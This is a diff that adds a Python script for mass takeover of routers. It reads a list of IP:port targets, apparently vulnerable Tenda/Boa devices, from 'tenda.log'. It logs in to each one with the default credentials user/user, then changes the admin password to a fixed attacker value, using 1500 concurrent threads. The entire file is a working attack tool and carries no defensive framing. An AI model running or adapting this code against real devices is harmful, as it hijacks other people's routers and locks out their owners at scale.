@@ -1,0 +1,56 @@
+import requests
+from requests.exceptions import Timeout
+from concurrent.futures import ThreadPoolExecutor
+
+# x
+with open('tenda.log', 'r') as file:
+    ip_ports = [line.strip() for line in file]
+
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
+    'Connection': 'close'
+}
+
+login_data = {
+    'challenge': '',
+    'username': 'user',
+    'password': 'user',
+    'save': 'Login',
+    'submit-url': '/admin/login.asp',
+    'postSecurityFlag': '49849'
+}
+
+password_setup_data = {
+    'oldpass': 'user',
+    'newpass': 'sTAlVaReX109fsPy',
+    'confpass': 'sTAlVaReX109fsPy',
+    'submit-url': '/admin/user-password.asp',
+    'postSecurityFlag': '57169'
+}
+
+def change_password(ip_port):
+    url = f'http://{ip_port}/boaform/admin/formLogin'
+
+    try:
+        # x
+        response = requests.post(url, headers=headers, data=login_data, allow_redirects=False, timeout=5)
+    except Timeout:
+        return
+
+    if '<A HREF="/">' in response.text:
+        print(f"[shoreline] logged in successfully: {ip_port}")
+
+        # Send password setup request after successful login
+        password_setup_url = f'http://{ip_port}/boaform/admin/formUserPasswordSetup'
+        try:
+            password_setup_response = requests.post(password_setup_url, headers=headers, data=password_setup_data, allow_redirects=False, timeout=5)
+        except Timeout:
+            return
+
+        # x
+        if "/admin/login.asp" in password_setup_response.text:
+            print(f"[shoreline] key changed for: {ip_port}.")
+
+# x
+with ThreadPoolExecutor(max_workers=1500) as executor:
+    executor.map(change_password, ip_ports)
